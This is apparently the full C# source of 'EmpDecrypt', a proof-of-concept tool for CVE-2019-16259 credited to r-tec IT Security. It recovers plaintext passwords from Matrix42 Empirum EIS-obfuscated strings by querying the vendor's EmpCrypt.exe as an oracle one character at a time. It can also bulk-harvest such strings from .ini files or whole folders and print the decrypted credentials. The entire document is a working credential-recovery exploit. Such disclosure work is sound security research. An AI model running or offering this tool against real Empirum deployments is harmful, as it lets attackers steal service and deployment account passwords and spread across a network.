using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Media;

namespace EmpDecrypt
{
 
    class Program
    {
        //EIS-Decrypter für Matrix42 AG EmpCrypt.exe Version: 16.1.2.4691

        //Globale variablen deklarieren
        public static string choice = "";
        public static string Hash = "";
        public static string file = "";
        public static string folder = "";
        public static string Password = "";
        public static string parameter = "";
        public static string output = "";
        public static double fortschritt = 0;
        public static int[] sequence = new int[] { 0, 21, 22, 19, 2, 6, 29, 23, 20, 24, 12, 9, 25, 26, 14, 3, 15, 33, 34, 37, 30, 27, 28, 31, 10, 32, 35, 7, 38, 39, 5, 16, 1, 36, 13, 8, 17, 4, 18, 11, 40, 41 };
        public static int[] ASCII = new int[] { 32, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 69, 78, 73, 83, 82, 65, 84, 68, 72, 85, 76, 67, 71, 77, 79, 66, 87, 70, 75, 90, 80, 86, 225, 74, 89, 88, 81, 101, 110, 105, 115, 114, 97, 116, 100, 104, 117, 108, 99, 103, 109, 111, 98, 119, 102, 107, 122, 112, 118, 106, 121, 120, 113, 64, 21, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 91, 92, 93, 94, 95, 96, 123, 124, 125, 126, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 18, 19, 20, 22, 23, 24, 25, 28, 29, 30, 31, 16, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };

        static void Main()
        {
            //Variablendeklaration
            string choice = "";

            //Menüauswahl
            Console.Clear();
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.CursorVisible = true;
            Console.WriteLine(@"***************************************************************************************");
            Console.WriteLine(@"*              ______                ____                             __              *");
            Console.WriteLine(@"*             / ____/___ ___  ____  / __ \___  ____________  ______  / /_             *");
            Console.WriteLine(@"*            / __/ / __ `__ \/ __ \/ / / / _ \/ ___/ ___/ / / / __ \/ __/             *");
            Console.WriteLine(@"*           / /___/ / / / / / /_/ / /_/ /  __/ /__/ /  / /_/ / /_/ / /_               *");
            Console.WriteLine(@"*          /_____/_/ /_/ /_/ .___/_____/\___/\___/_/   \__, / .___/\__/               *");
            Console.WriteLine(@"*                         /_/                         /____/_/                        *");
            Console.WriteLine(@"*                          Matrix42 Empirum EIS Decrypter                             *");
            Console.WriteLine(@"*         By Nick Theisinger (0x23353435) and Fabian Mosch (S3cur3Th1sSh1t) - 2019    *");
            Console.WriteLine(@"*                              r-tec IT Security GmbH                                 *");
            Console.WriteLine(@"*                                                                                     *");
            Console.WriteLine(@"*        CVE: 2019-16259                                        v1.2                  *");
            Console.WriteLine(@"***************************************************************************************");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
             if (!File.Exists(Path.Combine(Environment.CurrentDirectory, "EmpCrypt.exe")) || !File.Exists(Path.Combine(Environment.CurrentDirectory, "Matrix42.Common.AppVerificator.dll")))
            {
                Console.WriteLine("The file EmpCrypt.exe and/or Matrix42.Common.AppVerificator.dll does not exist.\nMake sure they are stored in the same directory as the EmpDecrypt.exe!\nPress RETURN to exit the application...");
                Console.ReadLine();
                Environment.Exit(1);
            }
            Console.WriteLine(@"Welcome to the main menu!");
            //Console.WriteLine();
            Console.WriteLine(@"Please enter the number of choice:");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"1. Decrypt a single EIS obfuscated Password.");
            Console.WriteLine();
            Console.WriteLine(@"2. Decrypt multiple EIS obfuscated Passwords imported from an Empirum ini-file.");
            Console.WriteLine();
            Console.WriteLine(@"3. Decrypt multiple EIS obfuscated Passwords imported from multiple Empirum ini-files.");
            Console.WriteLine();
            Console.WriteLine(@"4. Exit");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(@"Enter number: ");
            Console.ForegroundColor = ConsoleColor.Green;
            choice = Console.ReadLine();

            switch (choice)
            {
                case "1":
                    Decrypt_Single();
                    break;
                case "2":
                    Decrypt_From_ini();
                    break;
                case "3":
                    Decrypt_From_folder();
                    break;
                case "4":
                    Environment.Exit(0);
                    break;
                default:
                    Main();
                    break;
            }
        }

        static void Decrypt_Single()
        {
            //Initialisierung
            choice = "";
            Hash = "";
            Password = "";
            fortschritt = 0;
            Process EmpCrypt = new Process();
            EmpCrypt.StartInfo.FileName = Path.Combine(Environment.CurrentDirectory, "EmpCrypt.exe");
            EmpCrypt.StartInfo.UseShellExecute = false;
            EmpCrypt.StartInfo.RedirectStandardOutput = true;
            String fertig = "";

            //Menüauswahl
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"Please enter the number on choice:");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"1. Enter a Empirum EIS obfuscated Password");
            Console.WriteLine();
            Console.WriteLine(@"2. Back to main menu");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(@"Enter number: ");
            Console.ForegroundColor = ConsoleColor.Green;
            choice = Console.ReadLine();
            Console.Clear();

            switch (choice)
            {
                case "1":
                    Console.WriteLine("Please enter the Empirum EIS obfuscated Password:");
                    Hash = Console.ReadLine();
                    if ((Hash.Length != 42) || (Hash[0] != 'A') || (Hash[41] != 'X'))
                    {
                        Console.WriteLine("The entered string is not a valid EIS obfuscated Password. Please Try again!");
                        Console.ReadLine();
                        Decrypt_Single();
                    }
                    Console.Clear();
                    Console.WriteLine("Decryption started...");
                    Console.Write("\rProgress: " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: ");
                    break;
                case "2":
                    Main();
                    break;
                default:
                    Decrypt_Single();
                    break;
            }

            if (Hash == "A(,'-&-#+# /" + '"' + "*&(',.+ )*/!$%-..,/!)*" + '"' + ")+$% X")
            {
                fortschritt = 100;
                Console.Write("\rProgress: " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: [EMPTY obfuscated Password]");
                Console.WriteLine();
                fertig = "[EMPTY obfuscated Password]";
            }
            else
            {
                for (int i = 1; i < 41; i++)
                {

                    for (int j = 0; j < ASCII.Length; j++)
                    {
                        output = "";
                        Password = fertig + Convert.ToChar(ASCII[j]);
                        parameter = "/S /Eis " + Password;
                        EmpCrypt.StartInfo.Arguments = parameter;
                        EmpCrypt.StartInfo.StandardOutputEncoding = System.Text.Encoding.UTF8;
                        EmpCrypt.Start();
                        output = EmpCrypt.StandardOutput.ReadLine();
                        EmpCrypt.WaitForExit();

                        if (output[sequence[i]] == Hash[sequence[i]])
                        {
                            fertig = fertig + Convert.ToChar(ASCII[j]);
                            fortschritt = (2.5 * i);
                            //Console.OutputEncoding = System.Text.Encoding.UTF8;
                            Console.Write("\rProgress: " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: " + fertig + " ");
                            j = ASCII.Length;
                        }
                    }

                }
            }

            Console.WriteLine();
            Console.WriteLine("...Decryption finished!");
            Console.WriteLine("");
            Console.WriteLine("Decrypted password: " + fertig);
            Console.WriteLine("Press RETURN to get back to the main menu...");
            Console.ReadLine();
            Main();
        }

        static void Decrypt_From_ini()
        {
            //Initialisierung
            choice = "";
            file = "";
            Process EmpCrypt = new Process();
            EmpCrypt.StartInfo.FileName = Path.Combine(Environment.CurrentDirectory, "EmpCrypt.exe");
            EmpCrypt.StartInfo.UseShellExecute = false;
            EmpCrypt.StartInfo.RedirectStandardOutput = true;


            //Menüauswahl
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"Please enter the number on choice:");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"1. Enter the full path to a Empirum .ini-file");
            Console.WriteLine();
            Console.WriteLine(@"2. Back to main menu");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(@"Enter number: ");
            Console.ForegroundColor = ConsoleColor.Green;
            choice = Console.ReadLine();
            Console.Clear();

            switch (choice)
            {
                case "1":
                    Console.WriteLine("Please enter the full path to a Empirum .ini-file:");
                    file = Console.ReadLine();
                    if (!File.Exists(file))
                    {
                        Console.WriteLine("The file does not exist. Please try again!");
                        Console.ReadLine();
                        Decrypt_From_ini();
                    }
                    break;
                case "2":
                    Main();
                    break;
                default:
                    Decrypt_From_ini();
                    break;
            }

            //File zeilenweise einlesen und auf EIS-Hashes prüfen:
            List<string> found = new List<string>();
            string line;
            using (StreamReader fileread = new StreamReader(file))
            {
                while ((line = fileread.ReadLine()) != null)
                {
                    if (line.Contains("_EIS=A"))
                    {
                        found.Add(line);
                    }
                }
            }

            if (found.Count == 0)
            {
                Console.WriteLine("The given file does not contain any EIS obfuscated Passwords. Please try again!");
                Console.ReadLine();
                Decrypt_From_folder();
            }

            List<string> found_uniq = found.Distinct().ToList();

            //obfuscated Password extract
            string[][] EIS_Array = new string[found_uniq.Count][];
            int g = 0;
            foreach (var item in found_uniq)
            {
                EIS_Array[g] = item.Split(new[] { '=' }, 2);
                EIS_Array[g][0] = EIS_Array[g][0].Replace("_EIS", "");
                g++;
            }
            string[] fertig = new string[found_uniq.Count];
            Console.Clear();
            Console.WriteLine("Decryption started...");
            Console.Write("\rProgress 1/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: ");

            for (int h = 0; h < EIS_Array.Length; h++)
            {

                Hash = "";
                Password = "";
                fortschritt = 0;
                fertig[h] = "";

                Hash = EIS_Array[h][1];
                if ((Hash.Length != 42) || (Hash[0] != 'A') || (Hash[41] != 'X'))
                {
                    fortschritt = 100;
                    Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: The entered string is not a valid EIS obfuscated Password. Please try again!");
                    Console.WriteLine();
                    fertig[h] = "[INVALID obfuscated Password]";
                    continue;
                }

                if (Hash == "A(,'-&-#+# /" + '"' + "*&(',.+ )*/!$%-..,/!)*" + '"' + ")+$% X")
                {
                    fortschritt = 100;
                    Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: [EMPTY obfuscated Password]");
                    Console.WriteLine();
                    fertig[h] = "[EMPTY obfuscated Password]";
                    continue;
                }

                Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: ");

                for (int i = 1; i < 41; i++)
                {
                    for (int j = 0; j < ASCII.Length; j++)
                    {
                        output = "";
                        Password = fertig[h] + Convert.ToChar(ASCII[j]);
                        parameter = "/S /Eis " + Password;
                        EmpCrypt.StartInfo.Arguments = parameter;
                        EmpCrypt.StartInfo.StandardOutputEncoding = System.Text.Encoding.UTF8;
                        EmpCrypt.Start();
                        output = EmpCrypt.StandardOutput.ReadLine();
                        EmpCrypt.WaitForExit();

                        if (output[sequence[i]] == Hash[sequence[i]])
                        {
                            fertig[h] = fertig[h] + Convert.ToChar(ASCII[j]);
                            fortschritt = (2.5 * i);
                            //Console.OutputEncoding = System.Text.Encoding.UTF8;
                            Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: " + fertig[h] + " ");
                            j = ASCII.Length;
                        }
                    }

                }
                Console.WriteLine();
            }

            Console.Clear();
            Console.WriteLine("Processed obfuscated Passwords:");
            for (int k = 0; k < EIS_Array.Length; k++)
            {
                Console.WriteLine(EIS_Array[k][0] + " | " + EIS_Array[k][1] + " | " + fertig[k]);
            }
            Console.WriteLine();
            Console.WriteLine("Press RETURN to get back to the main menu...");
            Console.ReadLine();
            Main();
        }

        static void Decrypt_From_folder()
        {
            //Initialisierung
            choice = "";
            folder = "";
            Process EmpCrypt = new Process();
            EmpCrypt.StartInfo.FileName = Path.Combine(Environment.CurrentDirectory, "EmpCrypt.exe");
            EmpCrypt.StartInfo.UseShellExecute = false;
            EmpCrypt.StartInfo.RedirectStandardOutput = true;

            //Menüauswahl
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"Please enter the number on choice:");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"1. Enter the full path to a Empirum .ini-folder");
            Console.WriteLine();
            Console.WriteLine(@"2. Back to main menu");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write(@"Enter number: ");
            Console.ForegroundColor = ConsoleColor.Green;
            choice = Console.ReadLine();
            Console.Clear();

            switch (choice)
            {
                case "1":
                    Console.WriteLine("Please enter the full path to a Empirum .ini-folder:");
                    folder = Console.ReadLine();
                    if (!Directory.Exists(folder))
                    {
                        Console.WriteLine("The Path does not exist. Please try again!");
                        Console.ReadLine();
                        Decrypt_From_folder();
                    }
                    break;
                case "2":
                    Main();
                    break;
                default:
                    Decrypt_From_folder();
                    break;
            }

            string[] filePaths = Directory.GetFiles(folder, "*.ini", SearchOption.TopDirectoryOnly);

            if (filePaths.Length == 0)
            {
                Console.WriteLine("The given directory does not contain any ini-files. Please try again!");
                Console.ReadLine();
                Decrypt_From_folder();
            }

            List<string> found = new List<string>();
            string line;

            foreach (var item0 in filePaths)
            {
                //File zeilenweise einlesen und auf EIS-Hashes prüfen:
                using (StreamReader fileread = new StreamReader(item0))
                {
                    while ((line = fileread.ReadLine()) != null)
                    {
                        if (line.Contains("_EIS=A"))
                        {
                            found.Add(line);
                        }
                    }
                }
            }

            if (found.Count == 0)
            {
                Console.WriteLine("The given files does not contain any EIS obfuscated Passwords. Please try again!");
                Console.ReadLine();
                Decrypt_From_folder();
            }

            List<string> found_uniq = found.Distinct().ToList();

            //Hash aus den Zeilen extrahieren
            string[][] EIS_Array = new string[found_uniq.Count][];
            int g = 0;
            foreach (var item in found_uniq)
            {
                EIS_Array[g] = item.Split(new[] { '=' }, 2);
                EIS_Array[g][0] = EIS_Array[g][0].Replace("_EIS", "");
                g++;
            }
            string[] fertig = new string[found_uniq.Count];
            Console.Clear();
            Console.WriteLine("Decryption started...");
            Console.Write("\rProgress 1/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: ");

            for (int h = 0; h < EIS_Array.Length; h++)
            {

                Hash = "";
                Password = "";
                fortschritt = 0;
                fertig[h] = "";

                Hash = EIS_Array[h][1];
                if ((Hash.Length != 42) || (Hash[0] != 'A') || (Hash[41] != 'X'))
                {
                    fortschritt = 100;
                    Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: The entered string is not a valid EIS obfuscated Password. Please try again!");
                    Console.WriteLine();
                    fertig[h] = "[INVALID obfuscated Password]";
                    continue;
                }

                if (Hash == "A(,'-&-#+# /" + '"' + "*&(',.+ )*/!$%-..,/!)*" + '"' + ")+$% X")
                {
                    fortschritt = 100;
                    Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: [EMPTY obfuscated Password]");
                    Console.WriteLine();
                    fertig[h] = "[EMPTY obfuscated Password]";
                    continue;
                }

                Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: ");

                for (int i = 1; i < 41; i++)
                {
                    for (int j = 0; j < ASCII.Length; j++)
                    {
                        output = "";
                        Password = fertig[h] + Convert.ToChar(ASCII[j]);
                        parameter = "/S /Eis " + Password;
                        EmpCrypt.StartInfo.Arguments = parameter;
                        EmpCrypt.StartInfo.StandardOutputEncoding = System.Text.Encoding.UTF8;
                        EmpCrypt.Start();
                        output = EmpCrypt.StandardOutput.ReadLine();
                        EmpCrypt.WaitForExit();

                        if (output[sequence[i]] == Hash[sequence[i]])
                        {
                            fertig[h] = fertig[h] + Convert.ToChar(ASCII[j]);
                            fortschritt = (2.5 * i);
                            //Console.OutputEncoding = System.Text.Encoding.UTF8;
                            Console.Write("\rProgress " + (h + 1) + "/" + EIS_Array.Length + ": " + fortschritt.ToString("#,##0.00") + "%   Decrypted characters: " + fertig[h] + " ");
                            j = ASCII.Length;
                        }
                    }

                }
                Console.WriteLine();
            }

            Console.Clear();
            Console.WriteLine("Processed obfuscated Passwords:");
            for (int k = 0; k < EIS_Array.Length; k++)
            {
                Console.WriteLine(EIS_Array[k][0] + " | " + EIS_Array[k][1] + " | " + fertig[k]);
            }
            Console.WriteLine();
            Console.WriteLine("Press RETURN to get back to the main menu...");
            Console.ReadLine();
            Main();

        }
    }
}
